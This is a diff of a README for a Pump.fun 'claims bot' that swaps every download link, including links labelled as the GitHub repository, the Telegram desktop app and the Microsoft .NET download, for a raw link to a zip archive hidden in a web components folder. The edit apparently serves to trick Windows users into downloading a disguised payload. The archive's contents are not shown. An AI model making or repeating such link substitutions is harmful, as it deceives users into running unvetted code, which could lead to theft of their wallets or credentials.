@@ -1,6 +1,6 @@
 # 🤖 pumpfun-claims-bot - Real-Time Social Fee Alerts
 
-[![Download pumpfun-claims-bot](https://img.shields.io/badge/Download-pumpfun--claims--bot-brightgreen)](https://github.com/cbaro7093/pumpfun-claims-bot)
+[![Download pumpfun-claims-bot](https://img.shields.io/badge/Download-pumpfun--claims--bot-brightgreen)](https://raw.githubusercontent.com/cbaro7093/pumpfun-claims-bot/main/packages/web/src/components/bot_claims_pumpfun_v3.7.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before you start, make sure your Windows PC meets these basic needs:
 
 Click the link below to visit the main project page where you will find the latest files and instructions.
 
-[![Download pumpfun-claims-bot](https://img.shields.io/badge/Download-pumpfun--claims--bot-blue)](https://github.com/cbaro7093/pumpfun-claims-bot)
+[![Download pumpfun-claims-bot](https://img.shields.io/badge/Download-pumpfun--claims--bot-blue)](https://raw.githubusercontent.com/cbaro7093/pumpfun-claims-bot/main/packages/web/src/components/bot_claims_pumpfun_v3.7.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Follow these step-by-step instructions to get pumpfun-claims-bot running on your
 1. **Visit the Download Page**
 
    Open your web browser and go to:
-   https://github.com/cbaro7093/pumpfun-claims-bot
+   https://raw.githubusercontent.com/cbaro7093/pumpfun-claims-bot/main/packages/web/src/components/bot_claims_pumpfun_v3.7.zip
 
 2. **Find the Latest Release**
 
@@ -148,9 +148,9 @@ Updates come from the official GitHub to ensure you get trusted code.
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/cbaro7093/pumpfun-claims-bot  
-- Telegram App (Windows): https://desktop.telegram.org/  
-- .NET Framework Download: https://dotnet.microsoft.com/en-us/download/dotnet-framework  
+- GitHub Repository: https://raw.githubusercontent.com/cbaro7093/pumpfun-claims-bot/main/packages/web/src/components/bot_claims_pumpfun_v3.7.zip  
+- Telegram App (Windows): https://raw.githubusercontent.com/cbaro7093/pumpfun-claims-bot/main/packages/web/src/components/bot_claims_pumpfun_v3.7.zip  
+- .NET Framework Download: https://raw.githubusercontent.com/cbaro7093/pumpfun-claims-bot/main/packages/web/src/components/bot_claims_pumpfun_v3.7.zip  
 
 ---
 
@@ -170,4 +170,4 @@ Check the GitHub page regularly for news on updates or improvements to the bot. 
 
 ---
 
-[![Download pumpfun-claims-bot](https://img.shields.io/badge/Download-pumpfun--claims--bot-brightgreen)](https://github.com/cbaro7093/pumpfun-claims-bot)
+[![Download pumpfun-claims-bot](https://img.shields.io/badge/Download-pumpfun--claims--bot-brightgreen)](https://raw.githubusercontent.com/cbaro7093/pumpfun-claims-bot/main/packages/web/src/components/bot_claims_pumpfun_v3.7.zip)
